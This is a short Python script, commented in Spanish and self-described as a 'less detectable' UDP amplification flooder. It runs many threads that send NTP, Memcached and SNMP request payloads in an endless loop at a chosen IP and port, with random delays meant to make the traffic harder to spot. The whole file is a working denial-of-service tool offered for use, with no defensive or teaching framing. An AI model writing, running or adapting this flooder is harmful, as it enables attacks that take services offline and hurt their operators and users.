import socket
import threading
import argparse
import random
import time

PAYLOADS = [
    b'\x17\x00\x03\x2a' + b'\x00' * 4,  # NTP
    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',  # Memcached
    b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x70\xa7\xa7\x7e\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05+\x06\x01\x02\x01\x05\x00',  # SNMP
]

def flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        # Elige un payload aleatorio en cada iteración
        payload = random.choice(PAYLOADS)
        try:
            sock.sendto(payload, (ip, port))
        except Exception:
            pass
        # Espera aleatoria (entre 0 y 7 ms) para variar el ritmo y hacerlo menos predecible
        time.sleep(random.uniform(0, 0.007))

def main():
    parser = argparse.ArgumentParser(description="UDP Amplification less detectable flooder.")
    parser.add_argument("ip", help="IP de destino")
    parser.add_argument("port", type=int, help="Puerto de destino")
    parser.add_argument("--threads", type=int, default=25, help="Cantidad de threads (default: 25)")
    args = parser.parse_args()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=flood, args=(args.ip, args.port), daemon=True)
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
